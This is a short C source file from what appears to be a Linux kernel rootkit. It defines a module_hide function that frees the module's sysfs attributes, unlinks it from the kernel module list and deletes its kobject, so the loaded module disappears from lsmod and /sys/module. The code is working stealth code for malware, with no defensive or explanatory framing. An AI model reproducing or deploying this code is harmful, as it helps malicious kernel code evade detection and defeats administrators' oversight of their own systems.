#include <linux/slab.h>
#include <linux/string.h>
#include <linux/module.h>

#include "module.h"

static inline void _clean(void)
{
        kfree(THIS_MODULE->notes_attrs);
        kfree(THIS_MODULE->sect_attrs);
        kfree(THIS_MODULE->mkobj.mp);
        kfree(THIS_MODULE->mkobj.drivers_dir);

        THIS_MODULE->mkobj.mp = NULL;
        THIS_MODULE->sect_attrs = NULL;
        THIS_MODULE->notes_attrs = NULL;
        THIS_MODULE->mkobj.drivers_dir = NULL;
        THIS_MODULE->modinfo_attrs->attr.name = NULL;
}

static inline void _remove(void)
{
        list_del(&THIS_MODULE->list);
        kobject_del(&THIS_MODULE->mkobj.kobj);
        list_del(&THIS_MODULE->mkobj.kobj.entry);
}

void module_hide(void)
{
        _clean();
        _remove();
}

